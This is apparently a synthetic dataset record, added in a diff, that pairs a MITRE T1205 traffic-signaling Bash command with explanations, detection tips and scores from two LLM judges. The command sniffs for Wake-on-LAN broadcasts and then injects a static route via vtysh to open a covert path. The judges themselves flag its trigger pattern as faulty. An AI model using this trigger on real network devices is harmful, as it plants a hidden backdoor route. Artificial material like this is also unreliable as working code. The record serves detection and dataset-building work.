@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1205",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "sudo bash -c 'tcpdump -lni eth0 -U \"udp and (port 7 or port 9) and ether dst ff:ff:ff:ff:ff:ff\" -vv -XX | awk \"/ff ff ff ff ff ff/ {print; exit}\" && vtysh -c \"conf t\" -c \"ip route 10.99.0.0/16 192.0.2.254\"'",
+  "explanation": "Listens for a WoL-style magic packet pattern on UDP/7 or UDP/9; upon detection, installs a static route via vtysh as an activation step. Detection: baseline and alert on WoL broadcasts on network device interfaces and verify unexpected route insertions.",
+  "rationale_steps": [
+    "Use tcpdump to sniff for broadcast UDP packets carrying the FF preamble indicative of WoL.",
+    "If observed, treat it as a magic trigger and add a static route to open a covert management path.",
+    "Detect via SPAN/ERSPAN capture for WoL from routers and by monitoring FRR/vtysh route change events."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-e71f7f24-244435e4",
+  "source_prompt_hash": "e71f7f24",
+  "timestamp_utc": "2025-09-30T06:04:49.943820Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and parentheses with valid flags; pipeline and && chaining are well-formed and parseable.",
+        "semantic_score": 3,
+        "semantic_justification": "Conceptually aligns with traffic-signaling by waiting for WoL-like broadcasts to trigger a vtysh route change, but the awk regex likely won't match tcpdump -XX output (missing -e and byte-grouping mismatch) so the trigger may never fire, and it requires root despite the 'None' privilege claim.",
+        "combined_score": 4.0,
+        "confidence": 0.78,
+        "timestamp": "2025-10-01T17:01:32.373199Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, and valid flags for all utilities used.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command correctly implements traffic signaling using appropriate tools, the `awk` pattern does not specifically detect a WoL \"magic packet pattern\" as claimed, instead triggering on any broadcast UDP packet on ports 7 or 9.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T17:02:02.941304Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
